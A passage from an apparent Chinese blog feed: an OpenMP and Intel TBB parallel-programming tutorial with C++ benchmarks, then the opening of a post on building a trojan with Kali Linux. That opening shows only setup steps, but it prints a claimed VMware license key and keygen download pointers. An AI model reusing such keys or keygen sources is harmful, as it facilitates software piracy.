<li>上面只是最简单的两个效率测试，实质上tbb在OpenCV应用以及OpenMP一起在大数据算法处理上能力出众，提供封装好的各类并行算法(TBB可能需要重写处理类，但应用更高效)<blockquote>
<p>文末会进行数据挖掘(入门算法)Apriori频繁项集分类算法的在tbb下的速度测试</p>
</blockquote>
</li>
</ul>
<h2 id="说了这么多，教你怎么快速地配置OpenMP和Intel-TBB吧"><a href="#说了这么多，教你怎么快速地配置OpenMP和Intel-TBB吧" class="headerlink" title="说了这么多，教你怎么快速地配置OpenMP和Intel_TBB吧~"></a>说了这么多，教你怎么快速地配置OpenMP和Intel_TBB吧~</h2><h3 id="OpenMP是VS里面内置好的，配置很简单"><a href="#OpenMP是VS里面内置好的，配置很简单" class="headerlink" title="OpenMP是VS里面内置好的，配置很简单"></a>OpenMP是VS里面内置好的，配置很简单</h3><ul>
<li><p>例如你在vs建立了一个C++项目(我这里命名为tbb)</p>
<blockquote>
<p>点击上方菜单中的 项目-&gt; 属性<br><img src="http://img.blog.csdn.net/20170401002947814?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvQ1NETjU2ODMwMjIwMw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="选择项目属性"><br>在属性里面的 配置属性-&gt; C/C++ -&gt; 语言 -&gt; OpenMP支持选择 ‘是’，然后确定就行<br><img src="http://img.blog.csdn.net/20170401003208271?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvQ1NETjU2ODMwMjIwMw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="开启OpenMP支持"></p>
</blockquote>
</li>
<li><p>但是有一点要注意，这里开启OpenMP支持只是暂时的，也就是当前项目，如果你下次新建项目时可能还需要这样操作，如果想一劳永逸地开启，需要对项目配置表.props进行配置，稍后讲tbb会介绍到。</p>
</li>
</ul>
<blockquote>
<p>开启后就可以直接调用了，此处介绍最简单的也是最常用的parallel指令(并行执行指令)</p>
<pre><code>- parallel 是用来构造一个并行块的，也可以使用其他指令如for、sections等和它配合使用。
</code></pre></blockquote>
<pre><code>在C/C++中，parallel的使用方法如下：

#pragma omp parallel [for | sections] [子句[子句]…]

{

       //代码

}

parallel语句后面要跟一个大括号对将要并行执行的代码括起来。
</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">void main(int argc, char *argv[]) &#123;</div><div class="line">#pragma omp parallel</div><div class="line">&#123;	           printf(“Hello, World!\n”);</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">执行以上代码将会打印出以下结果</div><div class="line">Hello, World!</div><div class="line">Hello, World!</div><div class="line">Hello, World!</div><div class="line">Hello, World!</div></pre></td></tr></table></figure>
<pre><code>可以看得出parallel语句中的代码被执行了四次，说明总共创建了4个线程去执行parallel语句中的代码。
</code></pre><blockquote>
<p>也可以指定使用多少个线程来执行，需要使用num_threads子句：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">void main(int argc, char *argv[]) &#123;</div><div class="line">#pragma omp parallel num_threads(8)</div><div class="line">&#123;</div><div class="line">              printf(“Hello, World!, ThreadId=%d\n”, omp_get_thread_num() );</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">执行以上代码，将会打印出以下结果：</div><div class="line">Hello, World!, ThreadId = 2</div><div class="line">Hello, World!, ThreadId = 6</div><div class="line">Hello, World!, ThreadId = 4</div><div class="line">Hello, World!, ThreadId = 0</div><div class="line">Hello, World!, ThreadId = 5</div><div class="line">Hello, World!, ThreadId = 7</div><div class="line">Hello, World!, ThreadId = 1</div><div class="line">Hello, World!, ThreadId = 3</div></pre></td></tr></table></figure></p>
<p>从ThreadId的不同可以看出创建了8个线程来执行以上代码。所以parallel指令是用来为一段代码创建多个线程来执行它的。parallel块中的每行代码都被多个线程重复执行。</p>
</blockquote>
<p>和传统的创建线程函数比起来，相当于为一个线程入口函数重复调用创建线程函数来创建线程并等待线程执行完。<br>for指令的使用方法</p>
<p>for指令则是用来将一个for循环分配到多个线程中执行。for指令一般可以和parallel指令合起来形成parallel for指令使用，也可以单独用在parallel语句的并行块中。</p>
<blockquote>
<p>   #pragma omp [parallel] for [子句]<br>    for循环语句<br>    先看看单独使用for语句时是什么效果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">int j = 0;</div><div class="line">#pragma omp for</div><div class="line">for ( j = 0; j &lt; 4; j++ )&#123;</div><div class="line">         printf(“j = %d, ThreadId = %d\n”, j, omp_get_thread_num());</div><div class="line">     &#125;</div><div class="line">执行以上代码后打印出以下结果</div><div class="line">j = 0, ThreadId = 0</div><div class="line">j = 1, ThreadId = 0</div><div class="line">j = 2, ThreadId = 0</div><div class="line">j = 3, ThreadId = 0</div></pre></td></tr></table></figure></p>
</blockquote>
<p>从结果可以看出四次循环都在一个线程里执行，可见for指令要和parallel指令结合起来使用才有效果：<br>如以下代码就是parallel 和for一起结合成parallel for的形式使用的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">int j = 0;</div><div class="line">#pragma omp parallel for</div><div class="line">for ( j = 0; j &lt; 4; j++ )&#123;</div><div class="line">         printf(“j = %d, ThreadId = %d\n”, j, omp_get_thread_num());</div><div class="line">     &#125;</div><div class="line">执行后会打印出以下结果：</div><div class="line">j = 0, ThreadId = 0</div><div class="line">j = 2, ThreadId = 2</div><div class="line">j = 1, ThreadId = 1</div><div class="line">j = 3, ThreadId = 3</div></pre></td></tr></table></figure></p>
<blockquote>
<p>可见循环被分配到四个不同的线程中执行。<br>  上面这段代码也可以改写成以下形式：</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">int j = 0;</div><div class="line">#pragma omp parallel</div><div class="line">&#123;</div><div class="line">#pragma omp for</div><div class="line">for ( j = 0; j &lt; 4; j++ )&#123;</div><div class="line">         printf(“j = %d, ThreadId = %d\n”, j, omp_get_thread_num());</div><div class="line">     &#125;</div><div class="line">&#125;</div><div class="line">执行以上代码会打印出以下结果：</div><div class="line">j = 1, ThreadId = 1</div><div class="line">j = 3, ThreadId = 3</div><div class="line">j = 2, ThreadId = 2</div><div class="line">j = 0, ThreadId = 0</div></pre></td></tr></table></figure>
<blockquote>
<p>在一个parallel 块中也可以有多个for语句，如：</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">int j;</div><div class="line">#pragma omp parallel</div><div class="line">&#123;</div><div class="line">#pragma omp for</div><div class="line">for ( j = 0; j &lt; 100; j++ )&#123;</div><div class="line">…</div><div class="line">     &#125;</div><div class="line">#pragma omp for</div><div class="line">for ( j = 0; j &lt; 100; j++ )&#123;</div><div class="line">…</div><div class="line">     &#125;</div><div class="line">…</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="详细的OpenMP指令可以参见这里http-www-cnblogs-com-me115-archive-2011-01-25-1944598-html"><a href="#详细的OpenMP指令可以参见这里http-www-cnblogs-com-me115-archive-2011-01-25-1944598-html" class="headerlink" title="详细的OpenMP指令可以参见这里http://www.cnblogs.com/me115/archive/2011/01/25/1944598.html"></a>详细的OpenMP指令可以参见这里<a href="http://www.cnblogs.com/me115/archive/2011/01/25/1944598.html" target="_blank" rel="external">http://www.cnblogs.com/me115/archive/2011/01/25/1944598.html</a></h3><p><img src="http://img.blog.csdn.net/20170331234249525?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvQ1NETjU2ODMwMjIwMw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="在10^5数量级之后会有很显著的区别"></p>
<p><img src="http://img.blog.csdn.net/20170331235422125?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvQ1NETjU2ODMwMjIwMw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="代码执行速度超过普通的2倍！"></p>
<h3 id="附上文首两张对比图的我的源代码"><a href="#附上文首两张对比图的我的源代码" class="headerlink" title="附上文首两张对比图的我的源代码"></a>附上文首两张对比图的我的源代码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div></pre></td><td class="code"><pre><div class="line">#include&lt;tbb/parallel_for.h&gt;</div><div class="line">#include&lt;iostream&gt;</div><div class="line">#include &lt;tbb/parallel_sort.h&gt;</div><div class="line">#include &lt;math.h&gt;</div><div class="line">#include&lt;ctime&gt;</div><div class="line">#include&lt;algorithm&gt;</div><div class="line">#include&lt;random&gt;</div><div class="line">#include&lt;fstream&gt;</div><div class="line">using namespace std;</div><div class="line">long double sum;</div><div class="line">long long test_arr[222222222];</div><div class="line">void apply_transformation(long long &amp;x) &#123;</div><div class="line">	srand(time(NULL));</div><div class="line">	x = rand();</div><div class="line">	/*sum += double(double(x) / 100);*/ </div><div class="line">&#125;</div><div class="line">class apply_transform &#123;</div><div class="line">	long long *arr;</div><div class="line">public:</div><div class="line">	apply_transform(long long *a) : arr(a) &#123;&#125;</div><div class="line">	void operator()(const tbb::blocked_range&lt;long long&gt;&amp; r) const &#123;</div><div class="line">		for (long long i = r.begin(); i != r.end(); i++) &#123;</div><div class="line">			apply_transformation(arr[i]);</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">&#125;;</div><div class="line">void do_parallel_the_tbb_way(long long *a,int size) &#123;</div><div class="line">	tbb::parallel_for(tbb::blocked_range&lt;long long&gt;(0, size), apply_transform(a));</div><div class="line">&#125;</div><div class="line">void print_arr(float arr[]) &#123;</div><div class="line">	for (int i = 0; i &lt; 50; i++) &#123;</div><div class="line">		cout &lt;&lt; arr[i] &lt;&lt; &quot; &quot;;</div><div class="line">	&#125;</div><div class="line">	cout &lt;&lt; &quot;......&quot; &lt;&lt; endl;</div><div class="line">&#125;</div><div class="line">void init_arr(float arr[], float brr[],int N) &#123;</div><div class="line">	for (int i = 0; i &lt; N; i++) &#123;</div><div class="line">		arr[i] = sin((double)i);</div><div class="line">		brr[i] = cos((double)i);</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line">void init_arr2(long long size) &#123;</div><div class="line">	for (int i = 0; i &lt; size; i++)</div><div class="line">		test_arr[i] = 0;</div><div class="line">&#125;</div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">	ofstream outfile;</div><div class="line">	outfile.open(&quot;D://v_compare.txt&quot;);</div><div class="line">	clock_t start, end;</div><div class="line">	long long i;</div><div class="line">	//准备排序原料</div><div class="line">	long long size =1;</div><div class="line">	for (int j = 0; j &lt; 107; j++) &#123;</div><div class="line">		if (j &lt; 7) &#123;</div><div class="line">			size *= 10;</div><div class="line">		&#125;</div><div class="line">		else</div><div class="line">			size += 1000000;</div><div class="line">		init_arr2(size);</div><div class="line">			start = clock();</div><div class="line">			for (int i = 0; i &lt; size;i++)</div><div class="line">				apply_transformation(test_arr[i]);</div><div class="line">		end = clock();</div><div class="line">		cout &lt;&lt; &quot;普通串行赋值随机数所用时间:&quot;;</div><div class="line">		cout &lt;&lt; double(end - start) / CLOCKS_PER_SEC &lt;&lt; endl;</div><div class="line">		outfile &lt;&lt; double(end - start) / CLOCKS_PER_SEC &lt;&lt; &apos;\t&apos;;</div><div class="line">		init_arr2(size);</div><div class="line">		start = clock();</div><div class="line">		do_parallel_the_tbb_way(test_arr, size);</div><div class="line">		end = clock();</div><div class="line">		cout &lt;&lt; &quot;使用intel_tbb并行赋值随机数所用时间:&quot;;</div><div class="line">		cout &lt;&lt; double(end - start) / CLOCKS_PER_SEC &lt;&lt; endl;</div><div class="line">		outfile &lt;&lt; double(end - start) / CLOCKS_PER_SEC &lt;&lt; &apos;\t&apos;;</div><div class="line">		init_arr2(size);</div><div class="line">		start = clock();</div><div class="line">#pragma omp parallel  for</div><div class="line">		for (i = 0; i &lt; size; i++) &#123;</div><div class="line">			apply_transformation(test_arr[i]);</div><div class="line">		&#125;</div><div class="line">		end = clock();</div><div class="line">		cout &lt;&lt; &quot;vs自带Openmp并行赋值随机数所用时间:&quot;;</div><div class="line">		cout &lt;&lt; double(end - start) / CLOCKS_PER_SEC &lt;&lt; endl;</div><div class="line">		outfile &lt;&lt; double(end - start) / CLOCKS_PER_SEC &lt;&lt; &apos;\t&apos;;</div><div class="line">		outfile &lt;&lt; &quot;\n&quot;;</div><div class="line">	&#125;</div><div class="line">	outfile.close();</div><div class="line">	std::system(&quot;pause&quot;);</div><div class="line">	return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<blockquote>
<p>可以看到里面引进了#include’tbb/blocked_range.h’ #include’tbb/parallel_for.h’ #include ‘tbb/parallel_sort.h’这三个库，没错，OpenMP由于是内置的，可以直接调用指令，而Intel_tbb需要自己把库导进去，需要下载、配置、使用</p>
</blockquote>
<h3 id="Intel-TBB配置教程-图文"><a href="#Intel-TBB配置教程-图文" class="headerlink" title="Intel_TBB配置教程(图文)"></a>Intel_TBB配置教程(图文)</h3><blockquote>
<p>这个TBB配置还是略有难度，我刚开始没有配置成功，后来在配置OpenCV时顺便配置成功了…个人建议直接参照百度文库vs2013配置tbb的教程(vs2015也是一样的)，-<a href="https://wenku.baidu.com/view/cde69b86551810a6f4248650.html" target="_blank" rel="external">点这里看教程</a></p>
<h3 id="还没配置TBB成功的小伙伴看这里"><a href="#还没配置TBB成功的小伙伴看这里" class="headerlink" title="还没配置TBB成功的小伙伴看这里"></a>还没配置TBB成功的小伙伴看这里</h3><p>注意不要下载错了，官网上有个下载的坑，我们需要下载的是在官网的Release Page里面的,放到github上了<br><img src="http://img.blog.csdn.net/20170401012154244?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvQ1NETjU2ODMwMjIwMw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="点击Release Page"><br>-<a href="https://github.com/01org/tbb/releases" target="_blank" rel="external">点击这里直接进入下载页面</a><br><img src="http://img.blog.csdn.net/20170401012344198?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvQ1NETjU2ODMwMjIwMw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="可以看到各个版本，直接下载最新的压缩包"></p>
<p>-<a href="https://wenku.baidu.com/view/cde69b86551810a6f4248650.html" target="_blank" rel="external">点这里看TBB配置教程</a> 然后下面附上我的配置过程（VS2015）:<br>找到c++项目的配置管理器:<br><img src="http://img.blog.csdn.net/20170401013308781?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvQ1NETjU2ODMwMjIwMw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="一般在 视图-&gt;其它窗口-&gt;属性管理器可以找到"><br><img src="http://img.blog.csdn.net/20170401013444391?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvQ1NETjU2ODMwMjIwMw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="TBB可执行文件目录添加进去"><br><img src="http://img.blog.csdn.net/20170401013523905?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvQ1NETjU2ODMwMjIwMw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="TBB包含目录添加进去"><br><img src="http://img.blog.csdn.net/20170401013500656?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvQ1NETjU2ODMwMjIwMw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="TBB库目录添加进去，点确定后就Ok了"><br>注意，如果debug x86调试程序不行的话，试试debug x64和release x64的模式，可能你没有配置32位的属性<br><img src="http://img.blog.csdn.net/20170401013756299?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvQ1NETjU2ODMwMjIwMw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="这里是64位调试模式"></p>
</blockquote>
<h3 id="TBB配置好了的话，来点干货"><a href="#TBB配置好了的话，来点干货" class="headerlink" title="TBB配置好了的话，来点干货"></a>TBB配置好了的话，来点干货</h3><blockquote>
<p>TBB的使用的确比OpenMP更复杂一点，但功能略丰富一些，可以查看-<a href="http://www.ibm.com/developerworks/cn/aix/library/au-intelthreadbuilding/" target="_blank" rel="external">IBM的TBB使用文档</a>,开始尝试自己的第一个TBB多线程C++代码，如果示例代码可以运行的话，说明配置成功！<br>当然，还有以下推荐的关于tbb使用的博客或文库:</p>
<ul>
<li><a href="https://www.cppfans.org/1437.html" target="_blank" rel="external">初识英特尔线程构建模块之内存管理tbb_malloc</a></li>
<li><a href="http://www.360doc.com/content/14/1111/19/5470123_424361353.shtml" target="_blank" rel="external">C++并行计算库TBB和PPL的基本用法</a></li>
<li><a href="http://blog.sina.com.cn/s/blog_834b14b201015h4k.html" target="_blank" rel="external">TBB开始学习汇总</a><h2 id="TBB大幅提高数据挖掘基础Apriori算法并行处理不同数据集的效率"><a href="#TBB大幅提高数据挖掘基础Apriori算法并行处理不同数据集的效率" class="headerlink" title="TBB大幅提高数据挖掘基础Apriori算法并行处理不同数据集的效率"></a>TBB大幅提高数据挖掘基础Apriori算法并行处理不同数据集的效率</h2>(普通执行)串行输出结果<figure class="highlight plain"><figcaption><span>result of computation is 				followed——————————————</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">Get the data using time：0.084 s</div><div class="line">The I level Frequence_Item_Set is：</div><div class="line">Item_Set            Frequence</div><div class="line">&#123; 0 1 11 12 13 7 8 9  &#125;                 3</div><div class="line">Finish the level1 computation using time：24.309 s</div><div class="line">———————————The result of computation is followed——————————————</div><div class="line">Get the data using time：10.061 s</div><div class="line">The I level Frequence_Item_Set is：</div><div class="line">Item_Set            Frequence</div><div class="line">&#123; 0 1 11 12 13 7 8 9  &#125;                 6</div><div class="line">Finish the level2 computation using time：46.021 s</div><div class="line">———————————The result of computation is followed——————————————</div><div class="line">Get the data using time：5.079 s</div><div class="line">The Final Frequence_Item_Set is：</div><div class="line">Item_Set            Frequence</div><div class="line">&#123; 0 1 11 12 13 7 8 9  &#125;                 9</div><div class="line">&#123; 1 1232 15 17 4 5 6 9  &#125;               2</div><div class="line">Finish the level3 computation using time：76.491 s</div></pre></td></tr></table></figure>
</li>
</ul>
<p>(利用TBB并行执行)输出结果:<br><figure class="highlight plain"><figcaption><span>result of computation is followed——————————————</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">Get the data using time：0.076 s</div><div class="line">———————————The result of computation is followed——————————————</div><div class="line">Get the data using time：5.147 s</div><div class="line">———————————The result of computation is followed——————————————</div><div class="line">Get the data using time：10.097 s</div><div class="line">The I level Frequence_Item_Set is：</div><div class="line">Item_Set            Frequence</div><div class="line">&#123; 0 1 11 12 13 7 8 9  &#125;                 3</div><div class="line">Finish the level1 computation using time：31.086 s</div><div class="line">The I level Frequence_Item_Set is：</div><div class="line">Item_Set            Frequence</div><div class="line">&#123; 0 1 11 12 13 7 8 9  &#125;                 6</div><div class="line">Finish the level2 computation using time：57.545 s</div><div class="line">The Final Frequence_Item_Set is：</div><div class="line">Item_Set            Frequence</div><div class="line">&#123; 0 1 11 12 13 7 8 9  &#125;                 9</div><div class="line">&#123; 1 1232 15 17 4 5 6 9  &#125;               2</div><div class="line">Finish the level3 computation using time：91.35 s</div></pre></td></tr></table></figure></p>
</blockquote>
<ul>
<li>已经可以看到多线程并行和单线程串行的区别了，多线程并行是3个level一起读取数据，一起处理数据，而单线程串行是读取一个level数据处理一个level，一个一个来<blockquote>
<p>可能有人会有疑惑，用TBB执行不是更慢了吗，每个level的数据集所用时间都更长，而且最后用了91.35s &gt; 76.491s？！还有，读取数据的时间为什么这么长？</p>
<h3 id="实际所用的时间是这样"><a href="#实际所用的时间是这样" class="headerlink" title="实际所用的时间是这样:"></a>实际所用的时间是这样:</h3><p>串行用了24.309+46.021+76.491 s(读取数据的时间不算入)<br>而并行，只用了91.35 s(读取数据的时间不算入)<br>，效率是原来的1.6倍多！因为TBB是多线程运行，所以level1-level3一起同时开启，最终所有level完成所用时间就是最长的时间，即91.35 s，<br>而普通执行是一个接一个，所有时间要相加。</p>
</blockquote>
</li>
</ul>
<blockquote>
<p>执行代码多线程调用非常简单，只需要用tbb::task_group就可以了，不过需要自己定义一个可以被tbb调用的类，这里我用run<br><img src="http://img.blog.csdn.net/20170401021405551?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvQ1NETjU2ODMwMjIwMw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="调用TBB多线程的代码"><br>看起来是不是很像python里面的threading.Thread(target=function())模块,然后调用start()。不过这里的run并非一个函数，而是一个类模板。</p>
</blockquote>
<ul>
<li>再看一下CPU的变化情况，跟之前的平滑还是略有不同<br><img src="http://img.blog.csdn.net/20170401020226795?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvQ1NETjU2ODMwMjIwMw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="可以看出cpu略有波动"><blockquote>
<p>有兴趣的话可以尝试让cpu变成正弦图像，很有趣！<br><img src="http://img.blog.csdn.net/20170401020336066?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvQ1NETjU2ODMwMjIwMw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="有线程暂歇的情况"><br>当然，当多线程执行完全一样的for循环且for范围足够大，cpu的调度就会维持在系统默认的最大值(像我的电脑是70%),这种看起来还是比较协调<br><img src="http://img.blog.csdn.net/20170401020402832?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvQ1NETjU2ODMwMjIwMw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="完全调度"></p>
</blockquote>
</li>
</ul>
<h2 id="赶紧动手实践，用几行TBB-amp-OpenMP指令让你的C-代码执行速度提升吧！"><a href="#赶紧动手实践，用几行TBB-amp-OpenMP指令让你的C-代码执行速度提升吧！" class="headerlink" title="赶紧动手实践，用几行TBB&amp;OpenMP指令让你的C++代码执行速度提升吧！"></a>赶紧动手实践，用几行TBB&amp;OpenMP指令让你的C++代码执行速度提升吧！</h2><blockquote>
<p>有任何问题可以在评论区留言，我会及时解答或订正。<br><img src="http://img.blog.csdn.net/20170401022800636?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvQ1NETjU2ODMwMjIwMw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt=""></p>
</blockquote>
]]></content>
      
        <categories>
            
            <category> 作者:Hac </category>
            
            <category> 多线程并行算法的使用 </category>
            
            <category> C++调试优化 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Inter_TBB </tag>
            
            <tag> VS内置OpenMP </tag>
            
            <tag> C++库配置与使用 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[有点皮的安全渗透测试①:Kali-Linux 几行指令制作最简单的木马]]></title>
      <url>http://yikunhaocong.com/2017/03/25/kali-linux/</url>
      <content type="html"><![CDATA[<p></p><h2 id="intro">前言</h2>记录安装和配置Kali-linux，并使Msfvenom库生成木马和入侵win的过程。<p></p>
<a id="more"></a>
<h2 id="开始安装和配置Kali-Linux"><a href="#开始安装和配置Kali-Linux" class="headerlink" title="开始安装和配置Kali-Linux"></a>开始安装和配置Kali-Linux</h2><h3 id="1-虚拟机VMware下载与安装"><a href="#1-虚拟机VMware下载与安装" class="headerlink" title="(1)虚拟机VMware下载与安装"></a>(1)虚拟机VMware下载与安装</h3><p>VMware 12 Pro 12.1 发行说明<br><a href="http://pubs.vmware.com/Release_Notes/cn/workstation/12pro/workstation-121-release-notes.html" target="_blank" rel="external">http://pubs.vmware.com/Release_Notes/cn/workstation/12pro/workstation-121-release-notes.html</a><br>VMware 12 官方功能特性介绍：<br><a href="http://vmware.com/cn/products/workstation" target="_blank" rel="external">http://vmware.com/cn/products/workstation</a><br>VMware 12 专业版永久许可证密钥<br>5A02H-AU243-TZJ49-GTC7K-3C61N<br>VMware Workstation 12 官方简体中文专业版 + 注册机<br>VMware v11.x / v10.x  官方简体中文版经典版 + 注册机<br>v12.1.1 Build 3770994  官方本地下载  大小，293.67M<br><a href="http://pan.baidu.com/s/1cdWqF8" target="_blank" rel="external">http://pan.baidu.com/s/1cdWqF8</a>  访问密码: 28b4<br>注：新版不支持32位系统，系统是32位的请用VM10</p>
<h3 id="2-Kali-liunx-镜像下载与安装"><a href="#2-Kali-liunx-镜像下载与安装" class="headerlink" title="(2)Kali-liunx 镜像下载与安装"></a>(2)Kali-liunx 镜像下载与安装</h3><p>第一类，是最常规的32和64位版本：<br>kali-linux-2016.2-amd64.iso<br>kali-linux-2016.2-i386.iso<br>第二类是简化版：<br>kali-linux-light-2016.2-amd64.iso<br>kali-linux-light-2016.2-armel.img.xz<br>kali-linux-light-2016.2-armhf.img.xz<br>kali-linux-light-2016.2-i386.iso<br>第三类，是新增的四种桌面版，如e17、lxde、mate和xfce。<br>kali-linux-e17-2016.2-amd64.iso<br>kali-linux-lxde-2016.2-amd64.iso<br>kali-linux-mate-2016.2-amd64.iso<br>kali-linux-xfce-2016.2-amd64.iso<br><img src="http://img.blog.csdn.net/20170325161736981?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvQ1NETjU2ODMwMjIwMw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="Gnome桌面"><br><img src="http://img.blog.csdn.net/20170325161801806?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvQ1NETjU2ODMwMjIwMw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="Xfce桌面"></p>
<blockquote>
